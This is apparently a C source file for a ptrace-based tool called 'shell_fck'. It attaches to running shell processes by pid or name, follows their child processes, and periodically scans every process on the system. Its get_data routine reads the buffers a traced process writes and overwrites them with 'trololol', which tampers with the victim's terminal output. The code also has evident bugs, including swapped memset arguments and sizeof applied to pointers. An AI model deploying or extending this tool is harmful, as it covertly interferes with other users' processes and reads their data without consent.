#include "shell_fck.h"

//pthread_mutex_t mutex1 = PTHREAD_MUTEX_INITIALIZER;
//bool is_child = false;

/* Mainly used for debugging */
void do_child(pid_t pid, char **argv)
{
	puts("[*] Setting up child [*]\n");

	/* Tell parent we are ready to be traced */
	ptrace(PTRACE_TRACEME, pid, 0,0);
	kill(getpid(), SIGSTOP);

	/* do execve and stuff */
	char *bin = "/bin/bash";
	execv(bin, argv);

}

/* usage function */
void usage()
{
	printf("Example Uses\n[1] ./shell_fck -p <pid_to_attach>\n[2] ./shell_fck -n <name_of_process> (ie sh, zsh, bash...)\n[3] ./shell_fck -l (list running processes)\n");
}

int main(int argc, char **argv)
{
	pid_t pid;
	char *process_name;
	
	/* use for friendly options parsing */	
	struct option long_options[] = 
	{
		{"pid", required_argument, 0, 'p'},
		{"process_name", required_argument, 0, 'n'},
		{"List_processes", no_argument, 0 , 'l'},
		//{"inject_code", }
		{"help", no_argument, 0, 'h'}
	};

	/* if user didn't give args, we just run the shell ourselves */
	if(argc == 1)
	{
		pid = fork();

		if(pid == 0)
		{
			do_child(pid, argv);
		}
		else
		{
			//trace_child(pid);
		}
	}
	/* Otherwise, parse the users options and go from there */
	else
	{
		int option;
		int long_index = 0;
		char *value;
		while((option = getopt_long(argc, argv, "p:n:lh", long_options, &long_index)) != -1)
		{
			switch(option)
			{
				case 'p':
					pid = atoi(optarg);
					pthread_t thread_id;
					struct pid_struct *proc = (struct pid_struct *) malloc(sizeof(pid_struct));

					proc->pid = pid;
					memset(proc->proc_name, 0, sizeof(proc->proc_name));
					proc->is_child = false;
					proc->next = NULL;

					/* Create a new thread to handle messing with the process */
					if(pthread_create(&thread_id, NULL, init_thread, proc)) 
						printf("[!] Error creating thread [!]\n");

					pthread_join(thread_id, NULL); //wait for the thread to finish
					break;
				case 'n':
					process_name = optarg;
					struct pid_struct *current_pids = find_process(process_name, 0);
					free(current_pids);
					break;
				case 'l':
					find_process("ALL", 0);
					break;
				case 'h':
					usage();
					break;
			}
		}
	}

	/* using if(false) for testing purposes */
	if(true)
	{
		/* Initialise hash table */
		struct pid_hash_table *my_table = (struct pid_hash_table *)malloc(sizeof(pid_hash_table));
		my_table->size = 500;

		for(int i = 0; i < 500; i++)
			my_table->table[i] = NULL;
		//memset(my_table->table, , sizeof(my_table->table));

		while(true)
		{
			/*
			 * I want to create a simple process that does the following
			 * 1) iterate over all the processes on the system
			 * 2) update a hash table by adding/deleting processes that are/arent running
			 * 3) decide which processes to attach to	
		 	 * 4) attach to those processes using threads
			 * 5) sleep for a set amount of time so we don't hog system resources
			*/
			/* Step 1, grab the current processes */
			struct pid_struct *proc_list = find_process("ALL", 0); 
			struct pid_struct *p = proc_list;

			update_hash_table(p, my_table);

			/* free proc_list */
			while(p->next != NULL)
			{
				struct pid_struct *tmp = p->next;
				free(p);
				p = tmp;
			}
			
			/* Sleep to save system resources */
			sleep(30);
			//break;
		}
	}

}

void update_hash_table(struct pid_struct *current_pids, struct pid_hash_table *current_table)
{
	/* Before adding new processes to the table, we delete any that have been marked as dead */
	for(int i = 0; i < 500; i++)
	{
		struct pid_struct *p = current_table->table[i];
		while(p != NULL)
		{
			/* If the process has been marked as no longer running */
			if(pid_alive(p) == false)
			{
				if(p->next == NULL)
				{
					free(current_table->table[i]);
					current_table->table[i] = NULL;
				}
				else
				{
					remove_from_table(p, current_table->table[i]);
				}
			}
			p = p->next;
		}
	}
	
	/* iterate over the current process list */
	while(current_pids->next != NULL)
	{
		/* We set the bucket position to the pid modulo bucket size */
		int bucket_position = (current_pids->pid % current_table->size);

		/* We need to create a tmp pid struct to check if that position has a pid in it */
		struct pid_struct *tmp = current_table->table[bucket_position];

		if(tmp == NULL) //this means that the position is free
		{
			//add the pid to the table
			struct pid_struct *new_pid = create_pid_struct(current_pids->pid, current_pids->proc_name, current_pids->is_child, NULL);
			current_table->table[bucket_position] = new_pid;
		}
		else
		{
			while(tmp->next != NULL)
			{
				tmp = tmp->next;
			}
			struct pid_struct *new_pid = create_pid_struct(current_pids->pid, current_pids->proc_name, current_pids->is_child, NULL);
			tmp->next = new_pid;
		}
		current_pids = current_pids->next;
	}
	
	
}
	



void *init_thread(void *args)
{
	struct pid_struct *proc = (struct pid_struct *)args;

	printf("[+] Attempting to attach to pid: %d [+]\n", proc->pid);
	ptrace(PTRACE_ATTACH, proc->pid, NULL, NULL);

	printf("[+] Calling trace child on pid: %d\n", proc->pid);
	trace_child(proc);
}

void trace_child(struct pid_struct *proc)
{
	int status = 0, syscall, retval;
	struct user_regs_struct registers;
	/* These flags are needed to determine syscalls from systraps, and to trace clones */
	long flags = PTRACE_O_TRACESYSGOOD | PTRACE_O_TRACECLONE | PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK;

	//pid = waitpid(pid, &status, 0); //wait for sigstop
	
	ptrace(PTRACE_SETOPTIONS, proc->pid, 0, flags); //set ptrace options, so we can get syscalls//	
	printf("[+] Tracing pid: %d\n", proc->pid);
	int flag;
	while(true)
	{
		start:
		/* Wait for the first sigtrap when a syscall is hit */
		if(syscall_seen(proc) != SYSCALL_SEEN) break;


		ptrace(PTRACE_GETREGS, proc->pid, NULL, &registers);
		//printf("[pid: %d] System(%d)\n", pid, registers.orig_rax); //Need to map syscalls numbers to names

		/* If the sys_write is called from the child process, and not a grandchild */
		if(registers.orig_rax == 0 && proc->is_child)//1 = sys_read
		{
			/* For some reason when attaching to /bin/bash, we get stuck on read(3, "", 1)
			 * Setting the registers to 0 fixes this
			 * This needs to be handled better, the is_child boolean is a pretty shit fix
			 * TODO: Find some way of tracing the grandchild, ie by checking the pid.
			*/
			if(registers.rdx == 1)//for some reason it tries to read 1 byte
			{
				//registers.rdi = 3;
				registers.rdx = 0;
				ptrace(PTRACE_SETREGS, proc->pid, 0, &registers); //read(3, "", 0)
			}
		}
		/* Again, this is a pretty crap fix, maybe use a if(pid == grand_child_pid) */
		if(registers.orig_rax == 1 && proc->is_child) //sys_write
		{
			ptrace(PTRACE_GETREGS, proc->pid, 0, &registers);
			get_data(proc->pid, registers.rsi, &registers); //lets fuck stuff up
		}
		
		/* Grab the return from a syscall */
		if(syscall_seen(proc) != SYSCALL_SEEN) break;
		
		/* We can use the retval to match up calls -> returns */
		retval = ptrace(PTRACE_PEEKUSER, proc->pid, sizeof(long)*RAX, NULL);

		//printf("[pid: %d] System(%d) COMPLETE\n", pid, retval);
	}
}

int syscall_seen(struct pid_struct *proc)
{
	int status = 0;
	
	/* Here we loop until we either see a syscall or a new child process is created */
	while(true)
	{
		/* Tell the child to continue until the next syscall */
		ptrace(PTRACE_SYSCALL, proc->pid, 0,0);

		waitpid(proc->pid, &status, 0); //wait for something to happen
		
		/* We want to see if the process has been trapped */
		if(WSTOPSIG(status) == SIGTRAP && WIFSTOPPED(status))
		{
			/* If the child has created a new child, we trace that until it exits.  defined in man(ptrace)*/
			if(new_child(status))
			{
				pid_t pid_child;

				struct pid_struct *child_proc = (struct pid_struct *)malloc(sizeof(pid_struct));

				/* Get the pid of the new child */
				ptrace(PTRACE_GETEVENTMSG, proc->pid, 0, &pid_child);

				child_proc->pid = pid_child;
				child_proc->next = NULL;
				child_proc->is_child = true;

				printf("[!] Process is spawning a new child. pid: %d\n", child_proc->pid);

				/* lock the global is_child variable to this thread */
				//pthread_mutex_lock(&mutex1);
				//is_child = true;
				//pthread_mutex_unlock(&mutex1);

				trace_child(child_proc);
				
				return SYSCALL_SEEN; //return control to trace_child()
			}
		}
		if(WSTOPSIG(status) & 0x80 && WIFSTOPPED(status))
		{
			return SYSCALL_SEEN;
		}

		/* Child exited */
		if(WIFEXITED(status))
		{
			//pthread_mutex_lock(&mutex1);
			if(proc->is_child) free(proc);
			//pthread_mutex_unlock(&mutex1);
			printf("Child exiting...\n");
			proc->is_alive = false; //this child is ready to be removed from the hashtable
			return 1;
		}
	}
}

void get_data(pid_t pid, unsigned long addr, struct user_regs_struct *regs)
{
	/* Allocate memory for storing data */
	char *val = malloc(8096);
	memset(val, 8096, 0);
	int index = 0;
	unsigned long tmp;

	/* allocate stuff for messing with the data */
	char str[] = "trololol";
	long payload;
	
	while(index < 8096)
	{
		/* get the data at addr[index] */
		tmp = ptrace(PTRACE_PEEKDATA, pid, addr+index);

		/* store the data at that address in val */
		memcpy(val+index, &tmp, sizeof(long));

		/* This is how we mess with the ouput */
		memcpy(&payload, str, sizeof(str));
		ptrace(PTRACE_POKEDATA, pid, regs->rsi+index, payload);
		
		
		if (memchr(&tmp, 0, sizeof(tmp)) != NULL)
            		break;
		
        
		index += sizeof(long);

	}
	//printf("DATA FOUND:%s\n", val);
	free(val);

}

bool new_child(int status)
{
	/* This is defined in the manpage for ptrace, we need to look for all events of a clone otherwise we may miss some */
	return (status >> 8 == (SIGTRAP | (PTRACE_EVENT_CLONE << 8))) || (status >> 8) == (SIGTRAP | (PTRACE_EVENT_FORK << 8))  || (status >> 8) == (SIGTRAP | (PTRACE_EVENT_VFORK << 8));
}

struct pid_struct* find_process(char *needle, pid_t not_pid)
{
	char filename[256]; //buffer for filename

	/* Bit of linked list setup */
	struct pid_struct *root = (struct pid_struct *) malloc(sizeof(pid_struct));
	struct pid_struct *p = root;

	struct dirent *p_dirent;
	DIR *dir;
	char program_buffer[50]; //buffer to hold program name associate with pid

	memset(filename, 0, sizeof(filename));

	if((dir = opendir("/proc/")) == NULL)
	{
		printf("[!] Could not open directory [!]\n");
		return NULL;
	}

	/* iterate past the first few entries of the process directory */
	while((p_dirent = readdir(dir)) != NULL)
	{
		if(strcmp(p_dirent->d_name, "1") == 0) //we want to find the first process
			break;
	}

	/* read the status files of the processes until we get a shell process */
	while((p_dirent = readdir(dir)) != NULL)
	{
		/* set the filename up ready to open the status file */
		strcpy(filename, "/proc/");
		strcat(filename, p_dirent->d_name);
		strcat(filename, "/status");

		get_name_field(filename, program_buffer);
	
		/* DEBUG */
		//printf("%s: %s\n", filename, program);
		if(strcmp(needle, "ALL") == 0)
		{
			/* create a new pid struct with the details we have found */
			memset(p->proc_name, 0, sizeof(p->proc_name));
			p->pid = atoi(p_dirent->d_name);
			p->is_child = false;
			strncpy(p->proc_name, program_buffer, sizeof(p->proc_name));

			p->next = (struct pid_struct *) malloc(sizeof(pid_struct));

			printf("[+] Found %s process pid: %d [+]\n", p->proc_name, p->pid);

			p = p->next;
		}
		else if(strncmp(program_buffer, needle, sizeof(needle)) == 0)
		{
			printf("[+] Found %s process pid: %s [+]\n", needle, p_dirent->d_name);
			
			/*add that pid to the pid_struct, typical linked list */
			memset(p->proc_name, 0, sizeof(p->proc_name));
			p->pid = atoi(p_dirent->d_name);
			p->is_child = false;
			strncpy(p->proc_name, program_buffer, sizeof(p->proc_name));
			p->next = (struct pid_struct *) malloc(sizeof(pid_struct));
			p = p->next;
		}
		
		memset(filename, 0, sizeof(filename)); //reset filename
	}
	closedir(dir);

	p = root;
	return p;
}

/* We want to get the name associated with the pid */
void get_name_field(char *filename, char *buff)
{
	FILE *fp;
	
	memset(buff, 0, sizeof(buff));
	

	if((fp = fopen(filename, "r")) == NULL)
	{
		return;
	}

	fseek(fp, 6, SEEK_CUR); //seek past the "Name:\t" field

	fgets(buff, 40, fp); //grab the name, 40 bytes is more than enough
	fclose(fp);
	
	int i = 0;
	while(buff[++i] != '\n'); //handle the trailing new line

	buff[i] = '\00';
}